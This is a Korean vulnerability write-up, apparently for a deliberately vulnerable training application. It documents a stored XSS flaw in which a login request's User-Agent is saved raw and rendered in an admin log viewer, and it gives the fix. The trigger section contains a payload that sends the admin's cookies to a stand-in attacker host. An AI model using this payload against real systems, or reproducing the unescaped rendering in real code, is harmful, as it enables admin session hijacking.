# VULN-028 접속 로그 User-Agent 저장형 XSS (관리자 대상)

- 대상 스택: node-express, java-spring (client 공통)
- 심각도: High
- 분류: A03:2021 Injection (Stored XSS, CWE-79)

## 위치

로그인 시 `User-Agent` 헤더를 검증·이스케이프 없이 `login_logs`에 저장하고, 관리자 접속 로그
뷰어가 이를 그대로 HTML로 렌더한다. 공격자는 로그인만 시도해도(성공 불필요) 관리자 화면에
스크립트를 심을 수 있다.

- 저장: node `apps/node-express/src/routes/auth.js`(`POST /api/auth/login`),
  java `apps/java-spring/.../controller/AuthController.java` — `User-Agent`를 원문 저장.
- 렌더: `apps/client/src/pages/admin/AdminAccessLogs.jsx` — `userAgent`를
  `dangerouslySetInnerHTML`로 출력(`GET /api/admin/login-logs`).

## 트리거 방법

```
POST /api/auth/login
User-Agent: <img src=x onerror=fetch('https://attacker.example/c?c='+document.cookie)>
{"username":"anyone","password":"whatever"}      ← 실패해도 로그에 기록됨

→ 관리자가 /admin/logs(접속 로그) 열람 시 관리자 브라우저에서 스크립트 실행
```

## 영향

- 관리자 세션 하이재킹, 관리자 권한으로 임의 API 호출(사용자 권한 변경·계정 비활성화 등),
  자기전파형 페이로드 등. 비인증 상태에서도 심을 수 있어 무차별 공격에 노출.

## 증거 (재현 확인)

2026-08-28, 클린 재시드 후 로컬 재현(양 스택 동일): `User-Agent: <img src=x onerror=...>`로
로그인(실패) 시도 → `GET /api/admin/login-logs` 응답의 `userAgent`에 페이로드가 원문 그대로
저장·반환됨을 확인. 관리자 뷰어가 이를 HTML로 렌더.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: 저장 시 길이 제한/정규화, 렌더 시 텍스트로 이스케이프(React 기본 `{}` 사용,
`dangerouslySetInnerHTML` 금지). 로그 표시 필드 전반(username, ip 포함)을 동일하게 처리.
